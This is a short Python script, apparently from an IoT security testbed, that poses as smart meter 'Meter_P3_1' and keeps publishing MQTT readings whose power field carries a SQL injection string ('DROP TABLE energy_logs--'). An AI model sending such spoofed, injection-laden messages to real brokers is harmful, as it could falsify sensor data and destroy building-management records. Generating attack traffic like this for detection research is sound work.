import paho.mqtt.client as mqtt
import time
import random
import json
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
BROKER = os.getenv("BROKER_HOST", "emqx")
CLIENT_ID = f"Attack_{os.path.basename(__file__)}_{pod_id}"
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
client = mqtt.Client(client_id=CLIENT_ID)
client.connect(BROKER, 1883)
client.loop_start()

print("[!] Starting Shadow Flow Attack...")

try:
    while True:

        time.sleep(random.uniform(1, 5))
        # Payload που φαίνεται έγκυρο αλλά περιέχει SQL injection ή Scripting tags
        value = random.uniform(0.0, 10.0)
        malicious_value = f"{value}; DROP TABLE energy_logs--"
        payload = {"device": "Meter_P3_1", "power_kw": malicious_value}

        client.publish("building/floor1/roomA/power", json.dumps(payload), qos=0)
        print(f"[Meter_P3_1_Shadow] Sent malicious packet")
except KeyboardInterrupt:
    client.disconnect()
